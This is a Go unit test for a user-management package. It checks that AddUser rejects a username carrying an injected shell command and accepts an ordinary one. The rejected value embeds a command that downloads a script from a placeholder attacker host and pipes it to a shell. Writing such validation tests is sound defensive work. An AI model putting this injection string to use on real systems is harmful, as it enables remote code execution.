package tinyauthusers

import "testing"

func TestAddUserRejectsUnsafeName(t *testing.T) {
	path := t.TempDir() + "/users.json"
	err := AddUser(path, "x$(curl http://attacker/x|sh)y", "password123")
	if err == nil {
		t.Fatalf("AddUser(malicious name) = nil error, want a validation error")
	}
	if err := AddUser(path, "normal-user_1@example.com", "password123"); err != nil {
		t.Fatalf("AddUser(normal name) = %v, want success", err)
	}
}
